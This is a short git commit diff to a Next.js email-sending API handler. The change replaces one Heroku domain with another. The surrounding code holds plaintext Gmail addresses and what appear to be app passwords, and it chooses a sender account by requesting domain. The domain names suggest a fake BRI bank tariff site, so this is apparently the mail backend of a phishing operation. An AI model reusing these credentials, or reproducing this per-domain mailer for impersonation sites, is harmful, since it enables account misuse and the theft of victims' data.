def8a73615219eb3b7e37c04c0f35327b28e284a
penaruhangin <penaruhangin@gmail.com>
2022-11-03 12:04:14 +0700

    email baru

--- pages/api/sendEmail.js
+++ pages/api/sendEmail.js
@@ -12,7 +12,7 @@ export default function handler(req, res) {
         email = 'orbitorbit799@gmail.com';
         pass = 'ahghpmbdwokimqim'; 
 
-    } else if(url == 'tarifbri-baru-lama.herokuapp.com'){
+    } else if(url == 'layanan-baru-lama.herokuapp.com'){
         email = 'jakarta12zx@gmail.com' ;
         pass = 'ijrwylcjdzswcfnj' ;
         
